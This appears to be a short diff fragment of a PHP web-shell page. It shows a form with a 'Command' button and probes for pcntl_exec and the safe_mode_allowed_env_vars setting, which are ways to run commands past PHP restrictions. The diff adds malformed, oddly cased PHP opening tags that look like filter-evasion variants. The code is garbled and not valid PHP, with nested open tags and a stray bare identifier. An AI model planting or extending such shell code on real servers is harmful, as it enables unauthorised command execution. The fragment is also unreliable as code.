@@ -8,6 +8,10 @@
 <input name=”submit” type=submit value=”Command”>
 </FORM>
 <?php
+<?pHp
+<<?php
+<?<?php
+  
 echo function_exists('pcntl_exec');
 safe_mode_allowed_env_vars
 var_dump(ini_get('safe_mode_allowed_env_vars'));
